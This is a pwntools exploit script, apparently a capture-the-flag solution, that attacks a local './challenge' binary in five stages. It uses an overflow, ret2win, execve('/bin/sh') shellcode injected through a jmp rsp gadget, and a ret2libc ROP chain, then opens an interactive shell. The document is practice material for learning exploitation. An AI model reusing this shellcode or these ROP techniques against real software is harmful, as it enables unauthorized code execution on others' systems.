from pwn import *

context(terminal= ['tmux', 'split', '-h'])

p = process("./challenge")
binary = ELF("./challenge")
libc = ELF("/usr/lib/libc.so.6")

p.recvuntil("system is: ")
libc_leak = int(p.recvuntil("\n"), 16)

def pwn1():
    p.sendline(28*"A" + chr(42))
    pass

def pwn2():
    pattern = "aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap"
    index = pattern.find("aaakaaal")
#    gdb.attach(p, "continue")
    target_addr = binary.symbols["spawn_shell"]
    log.info("target address is: %s" % hex(target_addr))
    p.sendline(pattern[:index] + p64(target_addr))

def pwn3():
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    pattern = "aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap"
    index = pattern.find("aaakaaal")
    base_addres_libc = 0x00007ffff7de4000
    jmp_rsp_gadget = 0x000000000011f8d5
    payload = "A"*index + p64(base_addres_libc+jmp_rsp_gadget) + shellcode
    #gdb.attach(p)
    p.sendline(payload)


def pwn4():
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    pattern = "aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap"
    index = pattern.find("aaakaaal")
    base_address_libc = libc_leak - libc.symbols["system"]
    log.info("libc_base: %s" % hex(base_address_libc))
    jmp_rsp_gadget = 0x000000000011f8d5
    payload = "A"*index + p64(base_address_libc+jmp_rsp_gadget) + shellcode
    p.sendline(payload)

def pwn5():
    pattern = "aaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaap"
    index = pattern.find("aaakaaal")
    base_address_libc = libc_leak - libc.symbols["system"]
    log.info("libc_base: %s" % hex(base_address_libc))
    pop_rdi = 0x0000000000023be3
    sh_addr = libc.search("/bin/sh\x00").next()
    payload = "A"*index
    payload += p64(base_address_libc + pop_rdi)
    payload += p64(base_address_libc + sh_addr)
    payload += p64(base_address_libc + libc.symbols["system"])
#    gdb.attach(p)
    p.sendline(payload)



pwn5()

p.interactive()
